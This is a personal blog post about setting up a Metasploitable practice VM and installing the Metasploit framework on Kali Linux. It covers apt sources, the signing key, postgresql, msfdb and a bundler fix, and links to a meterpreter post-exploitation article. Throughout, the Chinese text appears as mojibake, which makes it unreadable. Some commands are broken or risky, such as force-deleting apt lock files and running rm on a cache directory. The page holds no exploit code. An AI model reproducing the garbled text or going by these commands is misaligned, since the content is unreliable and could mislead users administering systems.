<p>æ³¨æ„: æµ‹è¯•ç³»ç»Ÿä¸‹è½½ä¸‹æ¥åæ˜¯zipæ ¼å¼çš„ã€‚è§£å‹åä½¿ç”¨VMæ‰“å¼€ã€‚å¦‚æœæ˜¯VMwareçš„ï¼Œç›´æ¥æ‰“å¼€ç”¨VMwareæ‰“å¼€Metasploitable.vmxæ–‡ä»¶å³å¯ã€‚Metasploitableç³»ç»Ÿçš„é»˜è®¤è´¦å·å’Œå¯†ç æ˜¯msfadmin:msfadminå¦‚æœä½ æƒ³äº†è§£æ›´å¤šå…³äºMetasploitableçš„ä¿¡æ¯ï¼Œä½ å¯ä»¥å»ä¸‹é¢è¿™ä¸ªç½‘ç«™ï¼š<a target="_blank" rel="noopener" href="https://community.rapid7.com/docs/DOC-1875">https://community.rapid7.com/docs/DOC-1875</a></p>
<h3 id="2ğŸ±â€ğŸš€ã€åŠ å…¥æ›´æ–°æº"><a href="#2ğŸ±â€ğŸš€ã€åŠ å…¥æ›´æ–°æº" class="headerlink" title="2ğŸ±â€ğŸš€ã€åŠ å…¥æ›´æ–°æº"></a>2ğŸ±â€ğŸš€ã€åŠ å…¥æ›´æ–°æº</h3><p>ä¸€ã€æ›¿æ¢yumæºï¼ŒæŠŠkailåŸæœ‰æ›´æ–°æº#å·æ³¨é‡Šæ‰</p>
<p><img src="//upload-images.jianshu.io/upload_images/21549033-1ab4263a437bd7db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p>
<p>root@kali:~#vi /etc/apt/sources.listï¼ˆè¿™æ˜¯ä¿®æ”¹æ›´æ–°æºï¼‰</p>
<p>ï¼ˆæ›´æ–°æºå…¨å›½å„åœ°éƒ½ä¸ä¸€æ ·ï¼Œå› ä¸ºå½“åœ°çš„ç”µä¿¡ï¼Œç§»åŠ¨é˜²ç«å¢™ä¼šæ‹¦æˆªï¼‰</p>
<p>kali-rollingç‰ˆæœ¬ï¼šï¼ˆä¸­ç§‘å¤§çš„å°±å¤Ÿç”¨äº†ï¼Œä¸ªäººæŒ‰éœ€å§ï¼‰</p>
<p># kaliå®˜æ–¹æº</p>
<p>deb <a target="_blank" rel="noopener" href="http://http.kali.org/">http://http.kali.org/</a> kali-rolling main non-free contrib</p>
<p>deb-src <a target="_blank" rel="noopener" href="http://http.kali.org/">http://http.kali.org/</a> kali-rolling main non-free contrib</p>
<p>#ä¸­ç§‘å¤§æº</p>
<p>deb <a target="_blank" rel="noopener" href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
<p>deb-src <a target="_blank" rel="noopener" href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
<p><img src="//upload-images.jianshu.io/upload_images/21549033-56458e7248e32cb3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1069/format/webp" alt="img"></p>
<p>shift+ï¼šwqä¿å­˜é€€å‡º</p>
<h3 id="æ·»åŠ æ•°å­—ç­¾å"><a href="#æ·»åŠ æ•°å­—ç­¾å" class="headerlink" title="æ·»åŠ æ•°å­—ç­¾å"></a>æ·»åŠ æ•°å­—ç­¾å</h3><p>wget archive.kali.org/archive-key.asc   //ä¸‹è½½ç­¾å</p>
<p>apt-key add archive-key.asc   //å®‰è£…ç­¾å</p>
<p>æ³¨ï¼šå¦‚æœæ·»åŠ æ•°å­—ç­¾åè¿˜æç¤ºæ— æ³•å®‰è£…å¯åˆ é™¤åŸæœ‰msf</p>
<p>root@kali:~# apt remove metasploit-framework</p>
<p><strong>æ³¨ï¼š</strong>å¸è½½è¿‡ç¨‹ä¸­æ— æ³•è·å¾—é”/var/cache/apt/archives/lock - open (11:èµ„æºæš‚æ—¶ä¸å¯ç”¨)</p>
<p>æ— æ³•å¯¹ç›®å½•/var/cache/apt/archives/åŠ é”</p>
<p>root@kali:~# sudo rm /var/cache/apt/archives/lock  //è¿›è¡Œå¼ºåˆ¶è§£é”</p>
<p>root@kali:~# sudo rm /var/cache/apt/archives/ </p>
<hr>
<h2 id="å®‰è£…msfæ¡†æ¶"><a href="#å®‰è£…msfæ¡†æ¶" class="headerlink" title="å®‰è£…msfæ¡†æ¶"></a><strong>å®‰è£…msfæ¡†æ¶</strong></h2><p><strong>oot@bogon:~# apt-get update</strong></p>
<p>root@kali:~# apt-get  install metasploit-framework//å®‰è£…msfæ¡†æ¶</p>
<p><img src="//upload-images.jianshu.io/upload_images/21549033-cf4550c3ebbdb454.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/811/format/webp" alt="img"></p>
<p>é€‰æ‹©yesè¯´æ˜æ›´æ–°æˆåŠŸ</p>
<p>root@kali:~#msfconsole   //å‘ç°æœ‰æç¤ºæ•°æ®åº“æœªå¯åŠ¨ï¼Œé€€å‡ºmsfå¯åŠ¨æ•°æ®åº“</p>
<p>root@kali:~# systemctl start postgresql  //å¯åŠ¨æ•°æ®åº“</p>
<p>root@kali:~# systemctl enable postgresql //å…è®¸å¼€æœºè‡ªå¯åŠ¨</p>
<p>root@kali:~# msfdb init //æ„å»ºæ•°æ®åº“ç¼“å­˜</p>
<p>root@kali:~#msfconsole</p>
<hr>
<p>æ³¨æ„ï¼šå¦‚æœæ›´æ–°å®Œmsfå‡ºç°æ‰ä¸‹é—®é¢˜</p>
<p>root@kaliew:~# msfconsole</p>
<p>[*] Bundler failed to load and returned this error:</p>
<p>   â€˜cannot load such file â€“ bundler/setupâ€™</p>
<p>[*] You may need to uninstall or upgrade bundler</p>
<p>è§£å†³æ–¹æ³•ï¼š</p>
<p>root@kaliew:~# sudo gem install bundler</p>
<p>root@kaliew:~# bundle update celluloid</p>
<h2 id="MSFä¹‹meterpreteråæœŸæ”»å‡»ä½¿ç”¨æ–¹æ³•"><a href="#MSFä¹‹meterpreteråæœŸæ”»å‡»ä½¿ç”¨æ–¹æ³•" class="headerlink" title="MSFä¹‹meterpreteråæœŸæ”»å‡»ä½¿ç”¨æ–¹æ³•"></a>MSFä¹‹meterpreteråæœŸæ”»å‡»ä½¿ç”¨æ–¹æ³•</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/nb/46943313">https://www.jianshu.com/nb/46943313</a></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>future.zhangyan</span>
                    </p>
                
				
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://zhangyanlady.github.io/2019/10/06/Metasploit/">https://zhangyanlady.github.io/2019/10/06/Metasploit/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>The future can be expected, the world is worth it.</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># ç½‘ç»œå®‰å…¨</a>
                    
                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># æ¸—é€æµ‹è¯•</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>Â· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2019/10/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E4%B8%8B%E8%BD%BD/">æ–‡ä»¶ä¸Šä¼ ã€ä¸‹è½½</a>
            
            
            <a class="next" rel="next" href="/2019/09/30/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">ä¿¡æ¯æ”¶é›†</a>
            
        </section>
			</br>
			

</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>Â© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
	<span id="busuanzi_container_site_pv">
    æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡
</span>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

    </div>


	
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
